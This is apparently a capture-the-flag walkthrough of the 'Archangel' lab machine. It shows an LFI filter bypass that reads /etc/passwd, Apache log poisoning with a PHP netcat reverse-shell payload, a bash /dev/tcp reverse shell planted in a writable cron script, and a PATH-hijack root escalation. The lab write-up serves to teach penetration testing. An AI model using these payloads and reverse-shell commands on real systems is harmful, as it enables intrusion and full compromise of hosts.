# Archangel

## Nmap

```
sudo nmap 10.10.24.89 -p- -sS -sV  

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Looking at the immediate page on port 80 we see a hostname we can use of mafialive.thm.

![](<../../../.gitbook/assets/image (1428).png>)

I added this into /etc/hosts. Before checking the new hostname I scanned the IP further with dirsearch.py and only got one interesting hit on 'flags' which was a Rick Roll...

I then decided to browse tomafialive.thm and we immediately get the first flag.

![http://mafialive.thm/](<../../../.gitbook/assets/image (1429).png>)

Running dirsearch.py against this host reveals /robots.txt.

```
python3 dirsearch.py -u http://mafialive.thm/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -r -t 75 --full-url 
```

![](<../../../.gitbook/assets/image (1430).png>)

Browsing to and reading the contents of robots.txt the file contains the following:

```
User-agent: *
Disallow: /test.php
```

Browsing to /test.php shows the below page.

![http://mafialive.thm/test.php?view=/var/www/html/development\_testing/mrrobot.php](<../../../.gitbook/assets/image (1431).png>)

Clicking the button runs the string 'Control is an illusion'. We can see from the URL bar test.php is 'viewing' /var/www/html/development\_testing/mrrobot.php.

I tried running LFI parameters on 'test.php?view=' and was unable to discover any exploits. Searching through the following resource: [https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion). We have several ways we can attempt to exploit the web application.

We can try a PHP filter on base64 to attempt to read a file. We can run the command below to read the contents of test.php to see what it is trying to do.

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

Running this with curl we are returned a base64 string.

![](<../../../.gitbook/assets/image (1432).png>)

Running the string against base64 returns a flag and the PHP code for test.php

```
echo '<base64-String>' | base64 -d
```

![](<../../../.gitbook/assets/image (1433).png>)

The PHP code is shown below for easier reading.

```php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
if(isset($_GET["view"])){
if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
    include $_GET['view'];
}else{

    echo 'Sorry, Thats not allowed';
```

Looking at the following line in the code:

`if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {`

The exclamation mark stands for **NOT** so this line is saying if 'Does Not' contain '`../..`' and 'Does' contain `/var/www/html/development_testing` then perform the function.

We can use a list of filters in an attempt to fuzz and bypass the restrictions in order to read local files. Remembering from the code snippet above for the view parameter we need to include `/var/www/html/development_testing.`

Use this file for Fuzzing: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Traversal.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Traversal.txt).

```
wfuzz -w filters.txt -u http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ --hl 15 
```

The parameter `--hl 15` was used to filter out invalid responses. Resulting in matches for the results below:

![](<../../../.gitbook/assets/image (1434).png>)

Running curl against the target with a confirmed filter from above.

```
curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..///etc/passwd 
```

![](<../../../.gitbook/assets/image (1435).png>)

We can attempt to perform log poisoning to gain RCE and shell on the target machine. Running curl again we can view the Apache access log files. We can also see the recent requests performed above by wfuzz.

```
curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..///var/log/apache2/access.log
```

![](<../../../.gitbook/assets/image (1436).png>)

I will switch over th Burpsuite for this as it is easier to work in than curl if we need to troubleshoot our requests. Reload the page for accessing the access.log and catch the request with Burpsuite. We can then alter the user-agent field to contain PHP code. In the example below we are executing netcat on the target machine to create a reverse shell to us.

```
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.3.108 80 >/tmp/f') ?>
```

![](<../../../.gitbook/assets/image (1437).png>)

Once the request has been sent this will exist in access.log Simply reload the LFI for [http://mafialive.thm/test.php?view=/var/www/html/development\_testing/..//..//..//..///var/log/apache2/access.log](http://mafialive.thm/test.php?view=/var/www/html/development\_testing/..//..//..//..///var/log/apache2/access.log). This should then execute the PHP code and catch a shell on netcat on our attacking machine.

![](<../../../.gitbook/assets/image (1438).png>)

I then transferred over linpeas to the target machine. After exeucting linpeas identified a cronjob that is executed every minute by the user 'archangel'.

![](<../../../.gitbook/assets/image (1439).png>)

This cronjob is executing the file /opt/helloworld.sh. Viewing the permissions of the file we see we have the ability to edit the contents of the file. Currently every minute the file appends a new line to /opt/backupfiles/helloworld.txt

![](<../../../.gitbook/assets/image (1440).png>)

We can echo in a new line for a bash reverse shell and wait for it to execute.

```
echo 'sh -i >& /dev/tcp/10.14.3.108/443 0>&1' >> helloworld.sh
```

Start a `netcat` listener on our attacking machine.

```
sudo nc -lvp 443
```

Then wait for the cronjob to execute. If performed correctly we will have shell as the user 'archangel'.

![](<../../../.gitbook/assets/image (1441).png>)

Again running linpeas on the target machine we find a custom binary with the SUID bit set.

![](<../../../.gitbook/assets/image (1442).png>)

Looking at the results above we can see the binary is trying to execute the command 'cp' or copy without a full path specified and as such is unable to locate the binary.

We can take advantage of this by exporting a new path where our home directory is searched in first and then get our own malicious binary executed with the SUID privileges (root privileges).

First set a new path where the users home directory is the first entry.

```
PATH=/home/archangel:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

Then create a file containing a reverse shell in `/home/archangel`.

```
archangel@ubuntu:~$ touch cp
archangel@ubuntu:~$ echo '#!/bin/bash' > cp 
archangel@ubuntu:~$ echo 'sh -i >& /dev/tcp/10.14.3.108/80 0>&1' >> cp
archangel@ubuntu:~$ chmod +x cp
```

On the above commands we have created a file called 'cp' in the home directory of `/home/archangel` we have then set `/bin/bash` at the start of the script and then echo'd in on a new line a bash reverse shell. Finally we set the file to be executable with `chmod`.

Set up a `netcat` reverse shell on the attacking machine.

```
sudo nc -lvp 80
```

Then execute the backup binary:

```
archangel@ubuntu:~$ /home/archangel/secret/backup
```

We then receive a reverse shell as root.

![](<../../../.gitbook/assets/image (1443).png>)
